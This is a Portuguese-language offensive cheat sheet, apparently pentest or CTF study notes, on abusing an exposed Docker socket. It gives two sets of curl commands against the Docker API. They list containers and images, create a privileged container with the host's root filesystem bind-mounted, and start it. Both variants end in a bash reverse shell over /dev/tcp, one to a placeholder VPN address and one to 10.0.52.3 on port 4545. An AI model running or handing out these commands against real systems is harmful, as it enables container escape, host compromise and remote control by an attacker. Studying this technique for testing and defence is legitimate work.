
Normalmente os sockets ficam armazenados em `/var/run/docker.sock` e `/run/docker.sock`.
***
## Hacktricks
Listar os contêineres:
```sh
$ curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Agora que sabemos os contêineres que existem, podemos criar algum (`nginx:latest`) e mapear o sistema de arquivo do host em `hostfs`. Este comando irá retornar um `id`
```sh
curl -i -s -k -X POST -H 'Content-Type: application/json' --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "nginx:latest","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}' http://localhost/containers/create --unix-socket /var/run/docker.sock
```

Agora iremos iniciar o container utilizando o id que obtivemos:
```sh
curl -X POST --unix-socket /run/docker.sock http://localhost/containers/<container_id>/start
```

Podemos especificar um comando para ser executado, estaremos passando uma reverse shell:
```sh
curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<ip-vpn>/4545 0>&1"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/<container_id>/exec --unix-socket /var/run/docker.sock
```

Com o id que obtivemos, teremos que usar na seguinte requisição
```sh
curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/<EXEC-ID>/start --unix-socket /run/docker.sock
```

#### Referência
https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket
***
## k4sth4
Primeiro listamos os containers disponíveis.
```sh
$ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

Após listarmos as imagens disponíveis, podemos escolher qual vamos montar. Normalmente o nome do container fica em `RepoTags:[c3:latest]`.
```sh
curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"c3:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "sh >& /dev/tcp/10.0.52.3/4545 0>&1"]}'
```

Após criado podemos iniciar o container com o id que nos foi concedido. No sosso caso como colocamos uma rev shell para iniciar junto com o container, já devemos estar escutando na porta selecionada.
```sh
$ curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http://localhost/containers/c19a25c6cc7245030bf9741d300f632cc7f1e5f12adad238edce23d387ba00c2/start
```



